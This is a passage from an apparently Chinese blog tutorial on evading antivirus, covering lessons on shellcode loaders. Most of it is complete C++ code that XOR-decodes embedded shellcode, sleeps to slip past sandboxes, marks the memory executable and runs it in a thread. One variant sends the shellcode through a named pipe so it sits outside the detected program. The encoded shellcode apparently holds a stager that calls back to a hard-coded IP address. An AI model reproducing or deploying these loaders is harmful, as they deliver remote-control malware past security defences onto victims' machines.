4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    Sleep(<span class="number">50</span>);</span><br><span class="line">    _InterlockedXor8(buf+i,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第四课"><a href="#第四课" class="headerlink" title="第四课"></a>第四课</h1><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p><strong>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</strong></p><p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>何为管道：<strong>管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</strong></p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，<strong>一般管道是一个公开的内核对象，所有进程都可以访问。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)RecvShellcode,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p><h1 id="第五课"><a href="#第五课" class="headerlink" title="第五课"></a>第五课</h1><h2 id="真正意义的分离"><a href="#真正意义的分离" class="headerlink" title="真正意义的分离"></a>真正意义的分离</h2><p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png"></p><p><strong>BadCodeWithPipe</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BadCodePipeClient</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span 